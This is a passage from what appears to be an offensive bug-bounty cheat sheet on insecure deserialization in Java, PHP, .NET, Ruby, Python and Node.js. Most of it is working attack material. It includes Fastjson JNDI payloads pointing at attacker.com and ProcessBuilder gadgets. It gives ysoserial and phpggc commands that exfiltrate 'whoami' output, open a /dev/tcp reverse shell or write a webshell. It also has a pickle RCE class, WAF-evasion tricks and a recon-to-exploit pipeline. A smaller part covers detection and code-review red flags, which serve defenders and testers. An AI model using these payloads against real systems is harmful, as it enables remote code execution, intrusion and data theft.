GET /oauth/callback?code=xxx&state=rO0ABXNy... HTTP/1.1
Host: target.com
```

If the OAuth client deserializes the `state` parameter to restore session context, inject ysoserial payload.

#### JWT + Deserialization
Some implementations deserialize JWT claims:
```json
{
  "sub": "user123",
  "data": "rO0ABXNy...",
  "alg": "HS256"
}
```

If the application does `unserialize(base64_decode($jwt_claim['data']))`, inject gadget chain.

#### OpenID Connect ID Token
ID tokens are JWTs. If the OP (OpenID Provider) or RP (Relying Party) deserializes custom claims:
```json
{
  "custom_state": "O:4:\"User\":1:{s:4:\"name\";s:4:\"test\";}"
}
```

### OAuth Desync
Use OAuth redirect_uri to smuggle requests to deserialization endpoints:
```http
GET /oauth/authorize?client_id=xxx&redirect_uri=https://target.com/api/deserialize?data=rO0ABXNy... HTTP/1.1
```

---

## Parser Confusion Payloads

### JSON Parser Confusion
Different JSON parsers handle duplicate keys, large numbers, or type juggling differently:

#### Jackson Type Confusion
```json
{
  "@class": "java.net.URL",
  "val": "http://attacker.com/"
}
```

#### Fastjson AutoType Bypasses
```json
{
  "@type": "Lcom.sun.rowset.JdbcRowSetImpl;",
  "dataSourceName": "ldap://attacker.com/Evil",
  "autoCommit": true
}
```

Bypass blacklists using:
- `LLcom.sun.rowset.JdbcRowSetImpl;;`
- `[com.sun.rowset.JdbcRowSetImpl`
- `org.apache.xbean.propertyeditor.JndiConverter`
- `com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig`

### XML Parser Confusion
#### XStream
```xml
<contact class='java.lang.ProcessBuilder'>
  <command>
    <string>/bin/sh</string>
    <string>-c</string>
    <string>id</string>
  </command>
</contact>
```

#### XMLDecoder
```xml
<java version="1.4.0" class="java.beans.XMLDecoder">
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <void index="0"><string>/bin/sh</string></void>
      <void index="1"><string>-c</string></void>
      <void index="2"><string>id</string></void>
    </array>
    <void method="start"/>
  </object>
</java>
```

### YAML Parser Confusion
```yaml
!!java.net.URL ["http://attacker.com/"]
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/"]]]]
```

### PHP Type Juggling in Serialization
```
a:2:{s:4:"name";b:1;s:8:"password";b:1;}
```
If application compares strings loosely, `true == "anystring"` evaluates to true.

---

## Browser Quirks

### Request Line Parsing Differences
- Chrome/Safari: Allow space before request line
- Firefox: Strict parsing
- Some servers: Parse `GET /admin HTTP/1.1` differently if preceded by newline

### Content-Length + Transfer-Encoding
- Chrome: Prioritizes `Transfer-Encoding` if `Content-Length` is malformed
- Firefox: Same
- Some proxies: Prioritize `Content-Length`

### Chunked Encoding Handling
- Chunk extensions: `1;ext=val\r\nX\r\n0\r\n` — some parsers ignore extensions, others don't
- Chunk size parsing: `0x1` vs `1` vs `01`

### Cookie Parsing
- Some browsers send cookies in different orders
- `__Host-` prefix enforcement varies
- `SameSite=None; Secure` handling

### CORS + Deserialization
If deserialization endpoint is behind CORS, use:
1. `X-Requested-With: XMLHttpRequest` to bypass preflight in some frameworks
2. `Content-Type: text/plain` to avoid preflight, server still deserializes

---

## Gadget Chains

### Universal Gadget Chain Principles
1. **Entry Point**: A class whose method is called automatically during/after deserialization
2. **Bridge**: Classes that pass execution to the next gadget
3. **Sink**: A method that executes dangerous operations (`Runtime.exec()`, `eval()`, `file_put_contents()`)

### Java Gadget Chain Templates
#### Template: `readObject()` -> `toString()` -> `invoke()`
```java
// Entry: class with readObject() that calls toString() on field
// Bridge: class with toString() that calls method via reflection
// Sink: Method.invoke() -> Runtime.exec()
```

#### Template: `readObject()` -> `hashCode()` -> `URL.openConnection()`
```java
// Entry: HashMap.readObject() calls hashCode() on keys
// Bridge: URL.hashCode() triggers DNS lookup
// Sink: URLStreamHandler.getHostAddress() -> InetAddress.getByName()
```

### PHP POP Chain Templates
#### Template: `__destruct()` -> `save()` -> `file_put_contents()`
```php
// Entry: FileCookieJar.__destruct()
// Bridge: FileCookieJar.save() writes to file
// Sink: file_put_contents($filename, $data)
```

#### Template: `__wakeup()` -> `__toString()` -> `call_user_func()`
```php
// Entry: EvilClass.__wakeup() returns string
// Bridge: Class with __toString() that calls method on property
// Sink: call_user_func_array($this->callback, $args)
```

### .NET Gadget Chain Templates
#### Template: `Deserialize()` -> `TypeConverter` -> `XamlReader.Parse()`
```csharp
// Entry: BinaryFormatter.Deserialize()
// Bridge: ObjectDataProvider + TypeConverter
// Sink: XamlReader.Parse() executes ObjectDataProvider
```

---

## Real World Case Studies

### Equifax (2017)
**Vulnerability**: Apache Struts2 deserialization (CVE-2017-5638)
**Root cause**: Jakarta Multipart parser used `ObjectGraphNavigationLanguage` (OGNL) which could be exploited via Content-Type header containing `%{` payload, but the underlying issue involved deserialization of uploaded files.
**Impact**: 147 million records exposed.

### Cisco WebEx (2017)
**Vulnerability**: Java deserialization in WebEx client
**Gadget**: `Cisco WebEx Meetings` client deserialized update check responses.
**Impact**: RCE on client machines.

### Jenkins (2018-2019)
**Vulnerability**: Jenkins CLI remoting deserialization
**Gadget**: `Channel` deserialization allowed arbitrary object loading.
**Tool**: `jenkins-cli` + ysoserial `JRMPClient`.

### WebLogic (CVE-2018-2628, CVE-2020-2551)
**Vulnerability**: T3 protocol deserialization
**Gadget**: Various RMI/JNDI gadgets in WebLogic classpath.
**Impact**: Unauthenticated RCE.

### Liferay Portal (CVE-2020-7961)
**Vulnerability**: JSON deserialization via JSONWebService
**Gadget**: `JSONDeserializer` with `Flexjson` allowed arbitrary class instantiation.
**Impact**: RCE via `PortalClassLoader`.

### Apache OFBiz (CVE-2020-9496)
**Vulnerability**: XMLRPC deserialization
**Gadget**: `XMLRPC` request body deserialized to Java objects.

### Ruby on Rails (CVE-2013-0156, CVE-2019-5418)
**Vulnerability**: YAML/Marshal deserialization in params
**Gadget**: `YAML.load()` on user input in Rails 2/3.
**Impact**: RCE via `Psych` parser.

### PHP Laravel (CVE-2018-15133)
**Vulnerability**: POP chain in Laravel Cookie serialization
**Gadget**: `PendingBroadcast` + `Dispatcher` chain.
**Impact**: RCE via forged cookie (if APP_KEY leaked).

### Magento (CVE-2019-7938)
**Vulnerability**: PHP deserialization in customer import
**Gadget**: `Zend\Http\Response` + `__toString()`.

---

## Fuzzing Payloads

### Deserialization Detection Payloads

#### Java Detection
```
rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IAEWphdmEubmV0LlVSTCNa2jD7wIbNAgAESShhc2hDb2RlSU5ld1N0cmluZ1JlbWFsbgAACXN0cmVhbUhhbmRsZXJ0ABJMamF2YS9sYW5nL1N0cmluZztMAAN1cmxxAH4AA3hwACgqOABzdXIAEWphdmEubmV0LlVSTCRTdHJlYW1IYW5kbGVyGVgaxBqG2zA3AgAAeHAAAAAwcHQAI2h0dHA6Ly9hdHRhY2tlci5jb20ve3N5c3RlbS5nZXRQcm9wZXJ0eSgiY29tcHV0ZXIubmFtZSIpfXg=
```

#### PHP Detection
```
O:8:"stdClass":0:{}
a:1:{i:0;s:4:"test";}
s:32:"O:4:"User":1:{s:4:"name";s:4:"test";}";
```

#### .NET Detection
```
/wEyxgEAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAABFTeXN0ZW0uR3VpZC5VdWlsAQAAAAdjdXJyZW50AAZ0aW1lc3RhbXAHAQAAAAk=
```

#### Ruby Detection
```
BAhvOglVc2VyBjoJQG5hbWUiCWFkbWlu
```

### Magic Bytes / Signatures
| Format | Magic Bytes | Base64 Prefix |
|--------|-------------|---------------|
| Java | `AC ED 00 05` | `rO0AB` |
| PHP | `a:`, `O:`, `s:`, `i:`, `b:`, `N;` | N/A |
| .NET BinaryFormatter | Various | `/wE` |
| Ruby Marshal | `\x04\x08` | `BA` |
| Python Pickle | `80 02` / `80 03` / `80 04` | `gA` / `gAM` / `gAQ` |
| JSON | `{`, `[` | `ew` / `W1` |

### Polyglot Payloads
Payloads that look like one format but parse as another:
```
// JSON that is also valid PHP serialized array
a:1:{s:4:"test";}

// Base64 that decodes to both Java and PHP
rO0ABXNyABN... (Java)
```

### WAF Evasion Fuzzing
```
# Case variation
O:4:"User":1:{...}
o:4:"user":1:{...}

# Whitespace insertion
O : 4 : "User" : 1 : { ... }

# Null byte injection (PHP)
O:4:"User\x00":1:{...}

# Unicode normalization
Ｏ：４："User" (fullwidth characters)

# Comment injection (some parsers)
O:4:"User"/*comment*/:1:{...}
```

---

## Automation Workflows

### Recon + Deserialization Hunting Pipeline
```bash
# 1. Subdomain enumeration
subfinder -d target.com -o subs.txt

# 2. Probe for live hosts
httpx -l subs.txt -o live.txt

# 3. Crawl for endpoints
katana -list live.txt -o endpoints.txt

# 4. Filter for deserialization indicators
grep -iE "(serialize|unserialize|object|viewstate|__VIEWSTATE|rO0AB|AC ED|phar://|data://)" endpoints.txt

# 5. Nuclei scan for known deserialization CVEs
nuclei -l live.txt -t http/vulnerabilities/deserialization/

# 6. Interactsh for OOB detection
interactsh-client &
# Use interactsh URL in URLDNS payloads
```

### Mass Detection with nuclei + interactsh
```bash
# Generate URLDNS payloads with interactsh URL
java -jar ysoserial.jar URLDNS http://<interactsh-url> > payload.bin
base64 payload.bin > payload.b64

# Use nuclei template that injects payload.b64 into common parameters
nuclei -l targets.txt -t custom-deser-template.yaml
```

### Continuous Monitoring
```bash
# notify integration
nuclei -l targets.txt -t http/vulnerabilities/deserialization/ -silent | notify -bulk
```

### Burp Suite Automation
```python
# BApp extension: Turbo Intruder with deserialization payloads
# Use request smuggling + deserialization combined
```

---

## Recon Methodology

### Step 1: Identify Technology Stack
```bash
# HTTP headers
httpx -l targets.txt -json | jq '.[] | {url, tech, headers}'

# Wappalyzer / BuiltWith detection
# Look for:
# - X-Powered-By: ASP.NET (ViewState)
# - Server: Apache/PHP (PHP serialize)
# - X-Application-Context: Spring (Java)
# - X-Rack-Cache: Ruby/Rails
```

### Step 2: Find Deserialization Endpoints
Common parameter names:
```
data, obj, object, serialized, state, viewstate, __VIEWSTATE,
session, cache, metadata, config, settings, prefs, user_data,
json, xml, body, input, request, payload, token, id_token,
callback, oauth_state, redirect, next, return_to
```

Common endpoints:
```
/api/process
/api/parse
/api/deserialize
/api/import
/api/sync
/admin/restore
/admin/import
/admin/config
/j_acegi_security_check
/invoker/JMXInvokerServlet
/invoker/EJBInvokerServlet
/web-console/Invoker
/jmx-console/HtmlAdaptor
/admin-console/secure/summary.seam
```

### Step 3: Content-Type Analysis
```
application/x-java-serialized-object
application/octet-stream (with AC ED 00 05)
application/x-www-form-urlencoded (with base64 payload)
application/json (with @type or __class)
application/xml (with XMLDecoder or XStream)
text/xml
multipart/form-data (file uploads that get deserialized)
```

### Step 4: Cookie / Header Analysis
Look for:
- Large Base64 cookies (ViewState, Rails sessions, Java sessions)
- Cookies starting with `rO0AB` (Java)
- Cookies with `%3A` patterns (PHP serialize)
- `__VIEWSTATE` parameter (ASP.NET)
- `Faces-Request` header (JSF)

### Step 5: File Upload Testing
Upload files that trigger deserialization:
- `.phar` files (rename to `.jpg` if needed)
- `.xml` with XMLDecoder content
- `.json` with Jackson/Fastjson payloads
- `.ser` files (Java serialized)

### Step 6: Protocol Testing
- **RMI**: `nmap -sV --script=rmi-dumpregistry -p 1099 target`
- **JMX**: `jmxcmd target:9999`
- **T3**: Test WebLogic T3 protocol with `t3scan`
- **IIOP**: CORBA/IIOP endpoints in WebLogic/WebSphere

---

## Nuclei Templates

### Template Logic for Deserialization Detection
```yaml
id: java-deserialization-detection

info:
  name: Java Deserialization Detection
  author: custom
  severity: critical
  description: Detects Java serialized objects in HTTP responses/requests

detectors:
  - type: word
    words:
      - "rO0AB"
      - "AC ED 00 05"
    part: body

  - type: regex
    regex:
      - "rO0[A-Za-z0-9+/]+={0,2}"
    part: body
```

### Template: PHP Deserialization Detection
```yaml
id: php-deserialization-detection

info:
  name: PHP Deserialization Detection
  author: custom
  severity: high

http:
  - method: GET
    path:
      - "{{BaseURL}}"
    headers:
      Cookie: "session=O:8:%22stdClass%22:0:{}"
    matchers:
      - type: word
        words:
          - "unserialize"
          - "__PHP_Incomplete_Class"
        part: body
```

### Template: ViewState Deserialization (ASP.NET)
```yaml
id: viewstate-deserialization

info:
  name: ASP.NET ViewState Deserialization
  author: custom
  severity: critical

http:
  - method: POST
    path:
      - "{{BaseURL}}/"
    body: |
      __VIEWSTATE=/wEyxgEAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAABFTeXN0ZW0uR3VpZC5VdWlsAQAAAAdjdXJyZW50AAZ0aW1lc3RhbXAHAQAAAAk=
    matchers:
      - type: status
        status:
          - 500
          - 200
```

### Template: Fastjson Detection
```yaml
id: fastjson-deserialization

info:
  name: Fastjson Deserialization Detection
  author: custom
  severity: critical

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/json"
    headers:
      Content-Type: application/json
    body: |
      {"@type":"java.net.Inet4Address","val":"{{interactsh-url}}"}
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
```

### Template: PHAR Deserialization via File Upload
```yaml
id: phar-deserialization-upload

info:
  name: PHAR Deserialization via Upload
  author: custom
  severity: critical

http:
  - method: POST
    path:
      - "{{BaseURL}}/upload"
    body: |
      ------WebKitFormBoundary
      Content-Disposition: form-data; name="file"; filename="test.phar"
      Content-Type: image/jpeg

      {{base64_decode('...phar stub + gadget...')}}
      ------WebKitFormBoundary--
    matchers:
      - type: status
        status:
          - 200
```

### Template: Laravel APP_KEY Leak + RCE
```yaml
id: laravel-rce-deserialization

info:
  name: Laravel RCE via Deserialization
  author: custom
  severity: critical

variables:
  payload: "Tzo0MDoiSWxsdW1pbmF0ZVxcQnJvYWRjYXN0aW5nXFxQZW5kaW5nQnJvYWRjYXN0IjowOnt9"

http:
  - method: GET
    path:
      - "{{BaseURL}}"
    headers:
      Cookie: "laravel_session={{payload}}"
    matchers:
      - type: word
        words:
          - "ErrorException"
          - "unserialize"
        part: body
```

---

## Tools and Scanners

### Deserialization-Specific Tools
| Tool | Language | Purpose |
|------|----------|---------|
| **ysoserial** | Java | Generate Java deserialization payloads |
| **ysoserial.net** | .NET | Generate .NET deserialization payloads |
| **PHPGGC** | PHP | Generate PHP deserialization payloads |
| **marshalsec** | Java | JNDI/LDAP/RMI exploitation servers |
| **SerializationDumper** | Java | Analyze Java serialized streams |
| **Java-Deserialization-Cheat-Sheet** | Java | Reference for gadget chains |
| **jdwp-shellifier** | Java | JDWP exploitation (related) |
| **JMXExploit** | Java | JMX deserialization exploitation |
| **t3scan** | Java | WebLogic T3 protocol scanner |
| ** exploitdb** | Multi | Various deserialization exploits |

### General Recon / Exploitation
| Tool | Purpose |
|------|---------|
| **Burp Suite** | HTTP interception, Intruder, extensions |
| **http-request-smuggler** | Request smuggling detection |
| **param-miner** | Hidden parameter discovery |
| **smuggler** | Python request smuggling scanner |
| **nuclei** | Vulnerability scanner with deserialization templates |
| **httpx** | Fast HTTP prober |
| **katana** | Web crawler |
| **subfinder** | Subdomain enumeration |
| **interactsh** | OOB interaction server |
| **notify** | Notification framework |
| **SecLists** | Wordlists including deserialization payloads |
| **PayloadsAllTheThings** | Payload collection |

### Burp Extensions
- **Java Serial Killer**: Send ysoserial payloads directly from Repeater
- **Freddy**: Deserialization vulnerability detection
- **JSON Decoder**: For Jackson/Fastjson testing
- **HTTP Request Smuggler**: For desync + deserialization combos
- **Param Miner**: Find hidden deserialization parameters

---

## Advanced Research

### James Kettle (PortSwigger) — Key Papers
1. **HTTP Desync Attacks: Request Smuggling Reborn** (2019)
   - Introduced request smuggling as a modern attack vector
   - Showed how desync can bypass security controls
   - Relevant: Smuggle requests to deserialization endpoints

2. **Browser-Powered Desync Attacks** (2022)
   - Browser behaviors that cause HTTP desync
   - Client-side desync (CL.0, TE.TE)
   - Can force browsers to send serialized payloads to internal APIs

3. **Practical Web Cache Poisoning** (2018)
   - Cache poisoning via unkeyed inputs
   - Can poison caches with deserialization triggers

4. **Web Cache Entanglement** (2020)
   - Advanced cache poisoning techniques
   - Cache key confusion attacks

5. **Cracking the Lens: Targeting HTTPS Hidden Attack Surface** (2020)
   - Finding hidden attack surface behind CDNs/load balancers
   - Relevant: Finding deserialization endpoints behind proxies

6. **Hidden OAuth Attack Vectors** (2021)
   - OAuth state/deserialization issues
   - OpenID Connect vulnerabilities

### Alvaro Muñoz / Oleksandr Mirosh — Black Hat Research
- **.NET Deserialization**: `TypeConfuseDelegate`, `ActivitySurrogateSelector`
- **JSON.NET**: `TypeNameHandling` exploitation
- **ViewState**: Machine key brute-forcing + payload injection

### Matthias Kaiser — Java Deserialization
- `InvokerTransformer` blacklist bypasses
- `TemplatesImpl` gadget chains
- `JRE8u20` pure JDK gadget

### An Trinh / Tavis Ormandy
- Fastjson autoType bypasses
- Jackson polymorphic deserialization

### PHP Research
- **Sam Thomas**: PHAR deserialization (Black Hat 2018)
  - `phar://` wrapper as universal deserialization trigger
  - Any file function can trigger `unserialize()`
- **Laravel security team**: Multiple POP chains in Laravel/Symfony

---

## Bug Bounty Writeups

### Key Findings Patterns
1. **Cookie deserialization** → Modify cookie → `unserialize()` → RCE
2. **Request body deserialization** → POST JSON/XML → RCE
3. **File upload deserialization** → Upload PHAR/ser → Trigger via file op
4. **Cache poisoning** → Poison cache with serialized payload → Mass RCE
5. **Request smuggling** → Smuggle to internal deserialization endpoint
6. **OAuth callback** → State parameter deserialization
7. **Session fixation** → Session data deserialization mismatch

### Common Bounty Targets
- **Laravel apps**: Check `laravel_session` cookies, test APP_KEY leakage
- **Java apps**: Look for `rO0AB` patterns, RMI/JMX ports
- **ASP.NET apps**: ViewState parameters, check `EnableViewStateMac=false`
- **Rails apps**: Marshal cookies, check secret_key_base strength
- **Spring apps**: Jackson endpoints with `@class` or polymorphic types
- **WordPress**: Plugin deserialization, WooCommerce import features

### Writeup Structure for Reports
```
1. Identify deserialization endpoint
2. Determine language/framework
3. Check gadget availability (dependency analysis)
4. Generate appropriate payload (ysoserial/phpggc/ysoserial.net)
5. Achieve PoC (DNS ping / sleep / calc / file read)
6. Escalate to RCE if possible
7. Document impact (data exfil, lateral movement, etc.)
```

---

## Payload Collections

### Java Payloads
```java
// URLDNS (Detection only — no RCE)
// Payload: ysoserial URLDNS http://your-burp-collaborator.net
// Effect: DNS lookup to your server

// CommonsCollections6 (Universal — works on patched Java)
// Payload: ysoserial CommonsCollections6 'curl http://attacker.com/?c=$(whoami)'
// Prerequisites: CommonsCollections <= 3.2.1 on classpath

// Spring1 (Spring Framework apps)
// Payload: ysoserial Spring1 'nslookup attacker.com'
// Prerequisites: Spring Framework on classpath

// Hibernate1 (Hibernate apps)
// Payload: ysoserial Hibernate1 'id'
// Prerequisites: Hibernate on classpath

// JRMPClient (Tunnel through RMI)
// Step 1: java -jar ysoserial.jar JRMPListener 1099 CommonsCollections1 'calc'
// Step 2: java -jar ysoserial.jar JRMPClient attacker.com:1099
// Effect: Causes target to connect back to your JRMP listener and receive payload
```

### PHP Payloads
```php
// Basic detection
O:8:"stdClass":0:{}

// Laravel RCE (if APP_KEY known or no encryption)
// Generate: php phpggc Laravel/RCE1 system 'id'
// Effect: RCE via PendingBroadcast.__destruct()

// Symfony RCE
// Generate: php phpggc Symfony/RCE1 'id'
// Effect: RCE via TagAwareAdapter.__destruct()

// Monolog RCE
// Generate: php phpggc Monolog/RCE1 'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"'
// Effect: RCE via SyslogUdpHandler.__destruct()

// Guzzle File Write (no RCE but write shell)
// Generate: php phpggc Guzzle/FW1 /var/www/html/shell.php '<?php system($_GET[1]);?>'
// Effect: Writes webshell via FileCookieJar.__destruct()

// PHAR Universal Deserialization
// Step 1: php phpggc -p phar -o shell.phar Laravel/RCE1 system 'id'
// Step 2: Upload shell.phar (or rename to .jpg)
// Step 3: Trigger: file_exists('phar:///uploads/shell.jpg/test.txt')
```

### .NET Payloads
```csharp
// LosFormatter + TypeConfuseDelegate
// Generate: ysoserial.net -f LosFormatter -g TypeConfuseDelegate -o base64 -c "calc"
// Use in: __VIEWSTATE parameter

// BinaryFormatter + ObjectDataProvider
// Generate: ysoserial.net -f BinaryFormatter -g ObjectDataProvider -o base64 -c "nslookup attacker.com"

// Json.NET + ObjectDataProvider
// Payload:
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  },
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Object[], mscorlib",
    "$values": ["cmd", "/c calc.exe"]
  }
}
// Requires: TypeNameHandling.All

// ViewState (ASP.NET WebForms)
// Requires: known machineKey or EnableViewStateMac=false + ViewStateEncryptionMode=Never
// Generate: ysoserial.net -p ViewState -g ObjectDataProvider -c "powershell -enc ..." --path=/login.aspx --apppath=/
```

### Ruby Payloads
```ruby
# Rails session cookie (if secret_key_base known)
# Rails uses Marshal by default for cookie store
# 1. Decode cookie
# 2. Inject Marshal payload
# 3. Re-sign with secret

# Universal Marshal RCE (Ruby 2.x-3.x)
# Uses Gem::Requirement chain
# Generate with custom script or modify existing PoCs

# YAML RCE
# Psych.load() on:
--- !ruby/object:Gem::Requirement
requirements:
  - !ruby/object:Gem::Dependency
    name: "|/bin/sh"
```

### Python Payloads
```python
# Pickle RCE
import pickle
import base64
import os

class Evil:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(Evil()))
# Send payload to any pickle.loads() endpoint
```

### Node.js Payloads
```javascript
// node-serialize / serialize-javascript
// Vulnerable to IIFE injection
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id', function(error, stdout, stderr) { console.log(stdout) });}()"}
```

---

## WAF Bypasses

### Java WAF Bypasses
```
# Encoding
%72%4f%30%41%42... (URL encoded rO0AB)
r%4f0AB (mixed encoding)

# Chunked transfer
Transfer-Encoding: chunked
1
r
1
O
1
0
...

# Base64 variations
URL-safe base64: rO0ABXNy -> rO0ABXsy (replace +/ with -_)
No padding: rO0ABXNy... (remove trailing =)

# Nested serialization
Serialize a wrapper object that deserializes inner payload

# Compression
Gzip/deflate the serialized payload body
```

### PHP WAF Bypasses
```
# Array notation instead of objects
a:1:{i:0;O:4:"Evil":0:{}}

# Reference trick (R)
O:4:"User":2:{s:4:"name";s:4:"test";s:3:"ref";R:2;}

# Null byte in class name (legacy PHP)
O:9:"Evil\x00Class":0:{}

# Unicode class names
O:4:"Evil":0:{} vs O:4:"\x45vil":0:{}

# Nested serialization
s:32:"O:4:\"Evil\":0:{}";

# PHAR stub obfuscation
__HALT_COMPILER(); ?>
Can be preceded by any PHP code, GIF headers, etc.
```

### .NET WAF Bypasses
```
# ViewState encoding
LosFormatter supports binary and base64. Use binary if WAF inspects base64.

# ObjectStateFormatter
Alternative to LosFormatter with different output format.

# TypeConverter trick
Use TypeConverter to convert from string to dangerous type, bypassing string-based WAF rules.

# JSON.NET with $type
WAF may inspect JSON but not understand $type polymorphism.
```

### General Bypass Techniques
1. **Parameter pollution**: `data[]=payload` vs `data=payload`
2. **Content-Type switching**: `application/json` -> `application/x-www-form-urlencoded`
3. **Charset manipulation**: `Content-Type: application/json; charset=utf-16`
4. **HTTP/2 binary framing**: Some WAFs don't reassemble HTTP/2 streams correctly
5. **Request smuggling**: Bypass WAF entirely by smuggling payload past front-end

---

## Detection Techniques

### Passive Detection
1. **Magic bytes in HTTP traffic**:
   - `rO0AB` in cookies, headers, body
   - `AC ED 00 05` in binary bodies
   - `O:`, `a:`, `s:` patterns in PHP apps
   - `/wE` in ViewState parameters

2. **Error messages**:
   - Java: `java.io.InvalidClassException`, `ClassNotFoundException`, `OptionalDataException`
   - PHP: `unserialize() expects parameter 1 to be string`, `__PHP_Incomplete_Class`
   - .NET: `SerializationException`, `InvalidCastException`
   - Ruby: `marshal data too short`, `undefined class/module`

3. **Behavioral indicators**:
   - Large Base64 parameters in cookies
   - Binary data in POST bodies
   - `__VIEWSTATE` growing with page complexity

### Active Detection
1. **URLDNS / DNS detection**:
   - Inject ysoserial `URLDNS` payload
   - Monitor for DNS resolution to your server
   - Zero false positives if DNS resolves

2. **Sleep / Time-based**:
   - `CommonsCollections6 'sleep 10'`
   - Measure response time difference

3. **Error-based**:
   - Send malformed serialized data
   - Trigger specific error messages
   - `O:999:"NonExistent":0:{}` -> class not found error confirms deserialization

4. **Out-of-band (OOB)**:
   - Use interactsh or Burp Collaborator
   - `ysoserial URLDNS http://<oob-server>`
   - `phpggc Laravel/RCE1 'curl http://<oob-server>'`

5. **PHAR detection**:
   - Upload `.phar` file
   - Access `phar:///path/to/upload/file.jpg`
   - Look for `unserialize()` errors in logs

### Code Review Detection
```java
// Java red flags
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();  // DANGEROUS

XMLDecoder decoder = new XMLDecoder(request.getInputStream());
decoder.readObject();  // DANGEROUS

// Jackson red flags
mapper.enableDefaultTyping();
mapper.readValue(json, Object.class);  // DANGEROUS
```

```php
// PHP red flags
$data = unserialize($_GET['data']);  // DANGEROUS
$data = unserialize($_COOKIE['session']);  // DANGEROUS
$data = unserialize(file_get_contents('php://input'));  // DANGEROUS

// PHAR red flags
file_exists($user_input);  // DANGEROUS if user controls path
```

```csharp
// .NET red flags
BinaryFormatter bf = new BinaryFormatter();
bf.Deserialize(stream);  // DANGEROUS

LosFormatter lf = new LosFormatter();
lf.Deserialize(viewState);  // DANGEROUS

// Json.NET red flags
JsonSerializerSettings settings = new JsonSerializerSettings();
settings.TypeNameHandling = TypeNameHandling.All;  // DANGEROUS
```

```ruby
# Ruby red flags
Marshal.load(params[:data])  # DANGEROUS
YAML.load(params[:data])     # DANGEROUS (use safe_load)
```

---

## References

### PortSwigger Resources
- Web Security Academy: Insecure Deserialization
  - https://portswigger.net/web-security/deserialization
  - https://portswigger.net/web-security/deserialization/exploiting
  - Labs: Modifying Object Attributes, Arbitrary Object Injection (PHP), Application Functionality, Custom Gadget Chain, Java Generic Collections, Ruby Cookie

- Research Papers:
  - https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface
  - https://portswigger.net/research/browser-powered-desync-attacks
  - https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
  - https://portswigger.net/research/web-cache-entanglement
  - https://portswigger.net/research/practical-web-cache-poisoning
  - https://portswigger.net/research/hidden-oauth-attack-vectors

### GitHub Repositories
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization
- **ysoserial (Java)**: https://github.com/frohoff/ysoserial
- **ysoserial.net**: https://github.com/pwntester/ysoserial.net
- **PHPGGC**: https://github.com/ambionics/phpggc
- **marshalsec**: https://github.com/mbechler/marshalsec
- **Java Deserialization Cheat Sheet**: https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
- **Deserialization Payload List**: https://github.com/payloadbox/deserialization-payload-list
- **Bug Bounty Deserialization**: https://github.com/0xspade/bugbounty/tree/master/deserialization
- **Nuclei Templates**: https://github.com/projectdiscovery/nuclei-templates/tree/main/http/vulnerabilities/deserialization
- **ProjectDiscovery Suite**: nuclei, httpx, katana, subfinder, interactsh, notify
- **Burp Extensions**: http-request-smuggler, param-miner
- **Smuggler**: https://github.com/defparam/smuggler
- **Client-Side Prototype Pollution**: https://github.com/BlackFan/client-side-prototype-pollution
- **pp-finder**: https://github.com/yeswehack/pp-finder

### Knowledge Bases
- **HackTricks**: https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html
- **Infosec Writeups**: https://infosecwriteups.com/insecure-deserialization-exploitation-guide
- **Medium (Filedescriptor)**: https://medium.com/@filedescriptor/advanced-deserialization-and-gadget-chain-techniques

### Documentation
- **MDN JSON.parse**: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse
- **MDN structuredClone**: https://developer.mozilla.org/en-US/docs/Web/API/structuredClone

### Wordlists
- **SecLists Fuzzing**: https://github.com/danielmiessler/SecLists/tree/master/Fuzzing
- **SecLists Web Content**: https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content

### Specialized Tools
- **CursedChrome**: https://github.com/mandatoryprogrammer/CursedChrome (for browser-based attacks)
- **postMessage-tracker**: https://github.com/fransr/postMessage-tracker

---

## Quick Reference Cards

### "Is it Deserializable?" Checklist
- [ ] Does the app accept binary data in requests?
- [ ] Are there large Base64 cookies/parameters?
- [ ] Does the framework/language have known deserialization functions?
- [ ] Are there file upload features that process uploaded files?
- [ ] Does the app use RMI, JMX, or custom binary protocols?
- [ ] Are there `__VIEWSTATE`, `faces.ViewState`, or similar parameters?
- [ ] Does the app import data (XML, JSON, CSV) that gets object-mapped?
- [ ] Are session cookies opaque and large?

### "Can I Exploit It?" Checklist
- [ ] Can I control the serialized data?
- [ ] Is there a known gadget chain for the framework/version?
- [ ] Can I fingerprint dependencies (pom.xml, package.json, Gemfile)?
- [ ] Is there an OOB channel for detection (DNS, HTTP)?
- [ ] Can I achieve RCE, SSRF, file write, or other meaningful impact?

### Emergency Response: Found Deserialization
1. **Don't panic** — verify if it's actually exploitable
2. **Detect first** — Use URLDNS or sleep payload
3. **Fingerprint** — Determine exact framework/library versions
4. **Check gadgets** — Run `ysoserial --list` or `phpggc --list` for matches
